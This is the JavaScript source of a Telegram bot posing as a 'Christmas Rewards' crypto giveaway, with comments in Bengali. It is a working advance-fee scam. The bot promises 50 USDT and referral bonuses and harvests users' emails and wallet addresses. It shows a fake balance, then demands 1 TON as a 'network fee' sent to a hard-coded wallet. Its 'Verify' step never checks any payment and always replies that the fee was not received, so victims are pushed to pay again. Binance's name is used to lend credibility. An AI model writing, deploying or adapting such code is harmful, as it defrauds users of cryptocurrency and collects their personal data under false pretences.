const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const app = express();

const BOT_TOKEN = process.env.BOT_TOKEN;
const bot = new Telegraf(BOT_TOKEN);

const userData = {};

bot.start((ctx) => {
    ctx.reply(`👋 Hello, ${ctx.from.first_name}! Welcome to Christmas Rewards Bot\n\n🎁 Joining Reward: 50 USDT\n👥 Each Referral: 5 USDT\n\n📢 Must Complete Mandatory Tasks:\n\n🔹 Join our Telegram Channel: @Christmas_Rewards\n\n🗒️ After completing task click on [Continue] to proceed`, 
    Markup.keyboard([['🟢 Continue']]).resize());
});

bot.hears('🟢 Continue', (ctx) => {
    ctx.reply('🔹 Join @Christmas_Rewards\n\nAfter completing task click on [Done]', 
    Markup.keyboard([['✅ Done']]).resize());
});

bot.hears('✅ Done', (ctx) => {
    userData[ctx.from.id] = { step: 'email' };
    ctx.reply('🔹 Follow Binance Twitter Page (https://twitter.com/binance)\n🔹 Follow Binance Instagram Page (https://www.instagram.com/binance)\n\nSubmit Your Email ID To Proceed:', Markup.removeKeyboard());
});

bot.on('text', async (ctx) => {
    const text = ctx.message.text;
    const userId = ctx.from.id;

    // ১. আগে নির্দিষ্ট বাটনের নামগুলো চেক করা (Priority 1)
    if (text === '💰 Balance') {
        return ctx.reply(`🤴 User : ${ctx.from.first_name}\n\nYour Balance: 50 USDT\n\n📝 If you submitted wrong data then you can restart the bot by clicking /start`);
    }

    if (text === '↘️ Withdraw') {
        userData[userId] = { ...userData[userId], step: 'withdraw_wallet' };
        return ctx.reply('✅ Now Submit Your USDT (Ton) Wallet Address to confirm withdrawal:');
    }

    if (text === '✅ Confirm') {
        return ctx.reply(`📃 Please send 1 Ton as network fee for withdraw your USDT funds.\n\nAddress :- UQAGu8dbpHzjFmy7GtZXg4fuchEU4X1-WVDlNkOHWBiIRMwr\n\n➡️ once the server receives your transaction fee, you will receive your USDT within 2-3 minutes.\n\n⚠️ Note: After send transaction fee must click on [Verify] button`, 
        Markup.keyboard([['☑️ Verify']]).resize());
    }

    if (text === '☑️ Verify') {
        ctx.reply('🖐️ Hold on checking your transaction......');
        setTimeout(() => {
            ctx.reply('❎ We haven\'t received transaction fee.');
            setTimeout(() => {
                ctx.reply(`📃 Please send 1 Ton as network fee for withdraw your USDT funds.\n\nAddress :- UQAGu8dbpHzjFmy7GtZXg4fuchEU4X1-WVDlNkOHWBiIRMwr\n\n➡️ once the server receives your transaction fee, you will receive your USDT within 2-3 minutes.\n\n⚠️ Note: After send transaction fee must click on [Verify] button`, 
                Markup.keyboard([['☑️ Verify']]).resize());
            }, 1000);
        }, 3000);
        return;
    }

    // ২. এবার ইউজার ইনপুট (ইমেইল/ওয়ালেট) চেক করা (Priority 2)
    if (userData[userId]?.step === 'email') {
        userData[userId].email = text;
        userData[userId].step = 'wallet';
        return ctx.reply('➡️ Submit Your USDT (BEP-20) Wallet Address\n\nMust Submit Valid Wallet Address.');
    } 
    
    if (userData[userId]?.step === 'wallet') {
        userData[userId].wallet = text;
        userData[userId].step = 'completed';
        return ctx.reply('🎉 Congratulations, you have successfully joined the Christmas Rewards.', 
        Markup.keyboard([['💰 Balance', '↘️ Withdraw']]).resize());
    }

    if (userData[userId]?.step === 'withdraw_wallet') {
        userData[userId].step = 'ready_to_confirm'; // স্টেপ বদলে দিলাম যাতে আর এই ব্লকে না আসে
        return ctx.reply(`➡️ Your Balance 50.00 USDT\n\nPlease click on Confirm for proceed your USDT withdrawal`, 
        Markup.keyboard([['✅ Confirm']]).resize());
    }
});

const PORT = process.env.PORT || 3000;
app.get('/', (req, res) => res.send('Bot is Live!'));
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
    bot.launch();
});



